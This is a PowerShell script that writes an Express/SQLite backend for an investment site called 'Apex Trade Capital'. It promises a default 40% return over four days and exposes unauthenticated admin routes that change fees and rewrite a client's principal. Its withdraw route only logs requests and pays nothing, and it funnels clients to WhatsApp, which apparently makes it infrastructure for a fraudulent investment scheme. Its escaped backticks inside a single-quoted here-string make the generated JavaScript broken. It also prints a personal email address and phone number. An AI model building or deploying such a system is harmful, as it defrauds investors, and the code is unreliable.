# === AUTO APEX BACKEND FULL (stable + balance/progress/USD/adjust) ===
$ErrorActionPreference="Stop"
$root = Get-Location
$be   = Join-Path $root "backend"
$sv   = Join-Path $be   "server.js"
if (!(Test-Path $be)) { throw "backend/ introuvable" }
if (!(Test-Path $sv)) { throw "backend/server.js introuvable" }

# Backup
$stamp = Get-Date -Format "yyyyMMdd_HHmmss"
$bak   = Join-Path $be "server.$stamp.bak.js"
Copy-Item $sv $bak -Force
Write-Host "Backup -> $bak"

# Deps
Push-Location $be
npm i express cors helmet dotenv better-sqlite3 ws nodemailer bcrypt --no-fund --no-audit
Pop-Location

# Rewrite server.js
@'
import express from "express";
import cors from "cors";
import helmet from "helmet";
import dotenv from "dotenv";
import Database from "better-sqlite3";
import { WebSocketServer } from "ws";
import nodemailer from "nodemailer";
import bcrypt from "bcrypt";
import fs from "fs";
import path from "path";
import crypto from "crypto";

dotenv.config();
const app = express();
app.use(cors());
app.use(helmet());
app.use(express.json({ limit: "1mb" }));

// === DATA & DB ===
const dataDir = path.resolve("data");
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
const db = new Database(path.join(dataDir, "apextrade.db"));

// Tables
db.prepare(`CREATE TABLE IF NOT EXISTS users(
  id TEXT PRIMARY KEY,
  first_name TEXT,
  last_name  TEXT,
  country_code TEXT,
  dial TEXT,
  phone TEXT,
  created_at TEXT
);`).run();

db.prepare(`CREATE TABLE IF NOT EXISTS investments(
  id TEXT PRIMARY KEY,
  user_id TEXT,
  offer TEXT,
  amount INTEGER,
  status TEXT,           -- "pending"|"confirmed"|"running"|"paused"|"cancelled"|"finished"
  start_at TEXT,
  duration_days INTEGER,
  fee_percent REAL,
  fee_fixed   REAL,
  rate REAL,             -- rendement total cible (ex 0.4 = +40%)
  created_at TEXT,
  updated_at TEXT,
  FOREIGN KEY(user_id) REFERENCES users(id)
);`).run();

db.prepare(`CREATE TABLE IF NOT EXISTS events(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT,
  actor TEXT,
  type TEXT,
  payload TEXT
);`).run();

db.prepare(`CREATE TABLE IF NOT EXISTS otps(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  investment_id TEXT,
  user_id TEXT,
  otp_hash TEXT,
  expires_at TEXT,
  consumed INTEGER DEFAULT 0
);`).run();

// Mail admin
const ADMIN = process.env.ADMIN_EMAIL;
const mailer = nodemailer.createTransport({
  host: process.env.MAIL_HOST,
  port: parseInt(process.env.MAIL_PORT || "465"),
  secure: true,
  auth: { user: process.env.MAIL_USER, pass: process.env.MAIL_PASS }
});

// WS admin (option)
const wssPort = process.env.WS_PORT ? Number(process.env.WS_PORT) : 3001;
const wss = new WebSocketServer({ port: wssPort });
const wsClients = new Set();
wss.on("connection", ws => { wsClients.add(ws); ws.on("close", ()=>wsClients.delete(ws)); });
function broadcast(msg){
  const data = JSON.stringify({ topic:"events", ...msg });
  for (const ws of wsClients) { try { ws.send(data); } catch {} }
}

// Logger
function logEvent(actor, type, payload = {}) {
  const ts = new Date().toISOString();
  db.prepare("INSERT INTO events(ts,actor,type,payload) VALUES (?,?,?,?)").run(ts, actor, type, JSON.stringify(payload));
  broadcast({ ts, actor, type, payload });
  if (ADMIN && process.env.MAIL_USER) {
    const body = `Date: ${ts}\nType: ${type}\nActeur: ${actor}\nDétails:\n${JSON.stringify(payload,null,2)}`;
    mailer.sendMail({
      from: `"Apex Trade Capital" <${process.env.MAIL_USER}>`,
      to: ADMIN,
      subject: `[Apex] ${type}`,
      text: body
    }).catch(()=>{});
  }
}

// Utils
function nowISO(){ return new Date().toISOString(); }
function clamp(n,min,max){ return Math.max(min, Math.min(max,n)); }

// === Balance computation (linéaire) ===
function computeInvestmentState(inv, opts = {}) {
  const principal = Number(inv.amount || 0);
  const start = inv.start_at ? new Date(inv.start_at).getTime() : null;
  const durationMs = (inv.duration_days || 0) * 24*3600*1000;
  let progress = 0;
  if (start && durationMs>0) {
    const now = Date.now();
    progress = clamp(Math.round(((now - start)/durationMs)*100), 0, 100);
  }
  const rate = Number(inv.rate ?? opts.defaultRate ?? 0.40); // 40% par défaut
  const accrued = +(principal * rate * (progress/100));
  const fee_percent = Number(inv.fee_percent || 0);
  const fee_fixed = Number(inv.fee_fixed || 0);
  const fees_applied = +(principal * fee_percent/100) + fee_fixed;
  const net = +(principal + accrued - fees_applied);
  const usd_rate = Number(process.env.USD_RATE || 0);
  const net_usd = usd_rate ? +(net * usd_rate) : 0;
  return { principal, progress, accrued, fee_percent, fee_fixed, fees_applied, net, usd_rate, net_usd };
}

// === ROUTES ===

// Register simple
app.post("/api/register", (req,res)=>{
  const { firstName, lastName, countryCode, dial, phone } = req.body || {};
  if (!firstName || !lastName || !countryCode || !dial || !phone) {
    return res.status(400).json({ ok:false, error:"missing_fields" });
  }
  const id = "usr_" + crypto.randomUUID();
  db.prepare(`INSERT INTO users(id,first_name,last_name,country_code,dial,phone,created_at)
              VALUES (?,?,?,?,?,?,?)`)
    .run(id, firstName, lastName, countryCode, dial, phone, nowISO());
  logEvent(\`user:\${id}\`, "user_registered", { id, firstName, lastName, countryCode, dial, phone });
  res.json({ ok:true, userId:id });
});

// Create investment (pending)
app.post("/api/investments", (req,res)=>{
  const { userId, offer, amount, durationDays, rate } = req.body || {};
  if (!userId || !offer || !amount) return res.status(400).json({ ok:false, error:"missing_fields" });
  const id  = "inv_" + crypto.randomUUID();
  const now = nowISO();
  db.prepare(`INSERT INTO investments(id,user_id,offer,amount,status,start_at,duration_days,fee_percent,fee_fixed,rate,created_at,updated_at)
              VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(id, userId, offer, Number(amount), "pending", null, durationDays ? Number(durationDays) : 4, null, null, rate ?? 0.40, now, now);
  logEvent(\`user:\${userId}\`, "invest_created", { investmentId:id, offer, amount:Number(amount) });
  res.json({ ok:true, investmentId:id, status:"pending" });
});

// Confirm -> generate OTP to admin
app.post("/api/investments/:id/confirm", async (req,res)=>{
  const invId = req.params.id;
  const inv = db.prepare("SELECT * FROM investments WHERE id=?").get(invId);
  if (!inv) return res.status(404).json({ ok:false, error:"not_found" });

  const otp = String(Math.floor(100000 + Math.random()*900000));
  const otpHash = await bcrypt.hash(otp, 10);
  const ttlMin  = process.env.OTP_TTL_MIN ? parseInt(process.env.OTP_TTL_MIN) : 15;
  const exp     = new Date(Date.now() + ttlMin*60000).toISOString();

  db.prepare(`INSERT INTO otps(investment_id,user_id,otp_hash,expires_at,consumed)
              VALUES (?,?,?,?,0)`).run(invId, inv.user_id, otpHash, exp);

  db.prepare("UPDATE investments SET status='confirmed', updated_at=? WHERE id=?").run(nowISO(), invId);

  logEvent("system", "invest_confirmed", { investmentId:invId, userId:inv.user_id, offer:inv.offer, amount:inv.amount, otp_masked: otp.replace(/\d{3}$/,"***") });

  if (ADMIN && process.env.MAIL_USER) {
    const body = [
      "CONFIRMATION INVESTISSEMENT",
      \`Date : \${nowISO()}\`,
      \`InvestmentID : \${invId}\`,
      \`UserID : \${inv.user_id}\`,
      \`Offre : \${inv.offer}\`,
      \`Montant : \${inv.amount}\`,
      \`OTP (ADMIN) : \${otp}\`,
      \`Expire dans : \${ttlMin} min\`
    ].join("\\n");
    mailer.sendMail({ from:\`"Apex Trade Capital" <\${process.env.MAIL_USER}>\`, to:ADMIN, subject:\`[Apex] OTP invest \${invId}\`, text:body }).catch(()=>{});
  }

  res.json({ ok:true, status:"otp_sent_admin" });
});

// Verify OTP -> start running
app.post("/api/investments/:id/verify-otp", async (req,res)=>{
  const invId = req.params.id;
  const { otp } = req.body || {};
  if (!otp) return res.status(400).json({ ok:false, error:"missing_otp" });

  const row = db.prepare("SELECT * FROM otps WHERE investment_id=? AND consumed=0 ORDER BY id DESC LIMIT 1").get(invId);
  if (!row) return res.status(400).json({ ok:false, error:"otp_not_found" });
  if (new Date(row.expires_at) < new Date()) return res.status(400).json({ ok:false, error:"otp_expired" });

  const ok = await bcrypt.compare(otp, row.otp_hash);
  if (!ok) return res.status(400).json({ ok:false, error:"otp_invalid" });

  db.prepare("UPDATE otps SET consumed=1 WHERE id=?").run(row.id);
  const now = nowISO();
  db.prepare("UPDATE investments SET status='running', start_at=?, updated_at=? WHERE id=?").run(now, now, invId);
  logEvent("system","invest_started",{ investmentId:invId });
  res.json({ ok:true, status:"running" });
});

// Balance/progress endpoint
app.get("/api/investments/:id/balance", (req,res)=>{
  const inv = db.prepare("SELECT * FROM investments WHERE id=?").get(req.params.id);
  if (!inv) return res.status(404).json({ ok:false, error:"not_found" });
  const s = computeInvestmentState(inv, { defaultRate: 0.40 });
  res.json({
    ok:true,
    investmentId: inv.id,
    principal: s.principal,
    progress: s.progress,
    accrued: s.accrued,
    fee_percent: s.fee_percent,
    fee_fixed: s.fee_fixed,
    fees_applied: s.fees_applied,
    net_balance: s.net,
    currency: "HTG",
    usd_rate: s.usd_rate || 0,
    net_balance_usd: s.net_usd || 0
  });
});

// Admin: fees
app.post("/api/admin/fees", (req,res)=>{
  const { investmentId, feePercent, feeFixed } = req.body || {};
  if (!investmentId) return res.status(400).json({ ok:false, error:"missing_investmentId" });
  db.prepare("UPDATE investments SET fee_percent=?, fee_fixed=?, updated_at=? WHERE id=?")
    .run(feePercent ?? null, feeFixed ?? null, nowISO(), investmentId);
  logEvent("admin:system","fees_set",{ investmentId, feePercent, feeFixed });
  res.json({ ok:true });
});

// Admin: adjust balance (adjust principal)
app.post("/api/admin/adjust-balance", (req,res)=>{
  const { investmentId, newPrincipal } = req.body || {};
  if (!investmentId || newPrincipal == null) return res.status(400).json({ ok:false, error:"missing_fields" });
  db.prepare("UPDATE investments SET amount=?, updated_at=? WHERE id=?").run(Number(newPrincipal), nowISO(), investmentId);
  logEvent("admin:system","principal_adjusted",{ investmentId, newPrincipal:Number(newPrincipal) });
  res.json({ ok:true });
});

// Admin: pause/resume/cancel
app.post("/api/admin/pause", (req,res)=>{
  const { investmentId } = req.body || {};
  if (!investmentId) return res.status(400).json({ ok:false, error:"missing_investmentId" });
  db.prepare("UPDATE investments SET status='paused', updated_at=? WHERE id=?").run(nowISO(), investmentId);
  logEvent("admin:system","invest_paused",{ investmentId });
  res.json({ ok:true, status:"paused" });
});
app.post("/api/admin/resume", (req,res)=>{
  const { investmentId } = req.body || {};
  if (!investmentId) return res.status(400).json({ ok:false, error:"missing_investmentId" });
  db.prepare("UPDATE investments SET status='running', updated_at=? WHERE id=?").run(nowISO(), investmentId);
  logEvent("admin:system","invest_resumed",{ investmentId });
  res.json({ ok:true, status:"running" });
});
app.post("/api/admin/cancel", (req,res)=>{
  const { investmentId } = req.body || {};
  if (!investmentId) return res.status(400).json({ ok:false, error:"missing_investmentId" });
  db.prepare("UPDATE investments SET status='cancelled', updated_at=? WHERE id=?").run(nowISO(), investmentId);
  logEvent("admin:system","invest_cancelled",{ investmentId });
  res.json({ ok:true, status:"cancelled" });
});

// Withdraw (client)
app.post("/api/withdraw", (req,res)=>{
  const { userId, amount, network, account } = req.body || {};
  if (!userId || !amount || !network || !account) return res.status(400).json({ ok:false, error:"missing_fields" });
  logEvent(\`user:\${userId}\`,"withdraw_requested",{ amount:Number(amount), network, account });
  res.json({ ok:true, status:"requested" });
});

// WhatsApp helper (prérempli)
app.post("/api/whatsapp-link", (req,res)=>{
  const { context, userId } = req.body || {};
  const phoneRaw = process.env.WHATSAPP_NUMBER || "+16265333367";
  const dict = {
    register: "Bonjour, je souhaite créer mon compte.",
    invest:   "Bonjour, je souhaite réaliser un investissement.",
    withdraw: "Bonjour, je souhaite retirer mes bénéfices.",
    help:     "Bonjour, j’ai besoin d’assistance."
  };
  const msg = dict[context || "help"];
  const url = \`https://wa.me/\${phoneRaw.replace(/[^0-9]/g,"")}?text=\${encodeURIComponent(msg + (userId? " (User:"+userId+")": ""))}\`;
  res.json({ ok:true, url });
});

// Events & health
app.get("/api/events",(req,res)=>{
  const rows = db.prepare("SELECT * FROM events ORDER BY id DESC LIMIT 200").all();
  res.json({ ok:true, events: rows.map(r => ({...r, payload: safe(r.payload) })) });
});
function safe(s){ try{return JSON.parse(s||"{}")}catch{return{}} }

app.get("/api/health",(req,res)=> res.json({ ok:true, ts:new Date().toISOString() }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log(\`🚀 Backend lancé sur le port \${PORT} ; WS:\${wssPort}\`));
'@ | Set-Content $sv -Encoding UTF8

Write-Host "OK. Backend reconstruit."
Write-Host "Render → Backend → Settings → Environment :"
Write-Host "  MAIL_HOST=smtp.gmail.com"
Write-Host "  MAIL_PORT=465"
Write-Host "  MAIL_USER=loicndjana06@gmail.com"
Write-Host "  MAIL_PASS=<mot_de_passe_application_gmail>"
Write-Host "  ADMIN_EMAIL=loicndjana06@gmail.com"
Write-Host "  WS_PORT=3001"
Write-Host "  WHATSAPP_NUMBER=+16265333367"
Write-Host "  USD_RATE=0.012   # exemple HTG->USD"
Write-Host "  NODE_VERSION=20"
